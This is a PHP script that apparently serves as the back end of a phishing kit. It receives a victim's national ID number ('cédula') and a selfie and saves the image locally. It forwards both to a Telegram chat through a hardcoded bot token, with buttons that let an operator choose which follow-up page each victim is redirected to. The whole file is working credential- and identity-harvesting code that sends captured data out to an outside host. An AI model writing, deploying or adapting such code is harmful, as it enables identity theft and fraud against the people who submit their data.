<?php
$config = file_exists(__DIR__ . '/config.php') ? include __DIR__ . '/config.php' : [];
$BOT_TOKEN = $config['bot_token'] ?? '8714922704:AAG9dcP56xY_gdUktBusuZFMdlj5Aqo2p4k';
$CHAT_ID   = $config['chat_id'] ?? '-5234970591';

$DIR = __DIR__ . '/capturas';
if (!is_dir($DIR)) mkdir($DIR, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);
    $cedula = $data['cedula'] ?? '';
    $img64  = $data['image'] ?? '';

    if (!$cedula || !$img64) {
        echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
        exit;
    }

    $tid = uniqid("u");
    $filename = "$DIR/$tid.jpg";
    $imgData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $img64));
    file_put_contents($filename, $imgData);

    $caption = "🧍‍♂️ <b>Cédula:</b> <code>$cedula</code>\n📷 <b>Selfie recibida</b>";
    $keyboard = [
        "inline_keyboard" => [
            [["text" => "1️⃣", "callback_data" => "1:$tid"]],
            [["text" => "2️⃣", "callback_data" => "2:$tid"]],
            [["text" => "3️⃣", "callback_data" => "3:$tid"]],
        ]
    ];

    curl_post("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto", [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($filename),
        'caption' => $caption,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ]);

    echo json_encode(['ok' => true, 'tid' => $tid]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['tid'])) {
    $tid = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['tid']);
    $actionFile = '/tmp/actions/' . $tid . '.txt';

    if (file_exists($actionFile)) {
        $content = trim(file_get_contents($actionFile));
        $action  = explode('|', $content)[0] ?? '';
        if ($action !== '') {
            echo json_encode(['ok' => true, 'redirect' => "$action.php"]);
            exit;
        }
    }

    echo json_encode(['ok' => false]);
    exit;
}

function curl_post($url, $data) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data
    ]);
    curl_exec($ch);
    curl_close($ch);
}
